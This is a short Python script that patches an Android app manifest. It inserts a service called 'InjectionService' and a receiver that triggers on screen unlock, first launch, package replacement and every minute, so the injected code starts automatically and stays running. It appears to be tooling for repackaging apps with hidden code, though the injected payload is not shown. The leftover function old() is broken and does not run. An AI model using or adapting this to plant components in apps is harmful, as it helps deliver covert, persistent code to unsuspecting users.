import sys
import xml.dom.minidom as xml
import re


def old():
    manifestFile = sys.argv[1]
    with open(manifestFile) as manifest:
        xmlManifest =  xml.parseString(manifest.read())
        nodes = xmlManifest.getElementsByTagName('application')
        for node in nodes:
            newNode = xmlManifest.fromstring("<service android:name=\"com.secure.InjectionService\" android:enabled=\"true\"/>")
            node.insert(newNode)
            newNode = xmlManifest.createElement('')
            node.insertBefore(newNode)
            print xmlManifest.toxml()


def main():
    manifestFile = sys.argv[1]
    newManifest = ""
    with open(manifestFile) as manifest:
        manifest = manifest.read()
        applicationString =  re.findall("\<application.*\>",manifest)[0]
        pos = manifest.find(applicationString)+len(applicationString)
        manifest = manifest[:pos] + "\n<service android:name=\"com.secure.InjectionService\" android:enabled=\"true\"/>" +\
                  '\n<receiver android:name="com.secure.Receiver">\n<intent-filter>\n<action android:name="android.intent.action.TIME_TICK" />\n<action android:name="android.intent.action.USER_PRESENT" />\n<action android:name="android.intent.action.PACKAGE_FIRST_LAUNCH" />\n<action android:name="android.intent.action.PACKAGE_REPLACED" />\n</intent-filter>\n</receiver>'\
                   + manifest[pos:]
        newManifest = manifest
    targetFile = open(manifestFile,'w')
    targetFile.write(newManifest)
    targetFile.close()

if __name__ == "__main__":
    main()
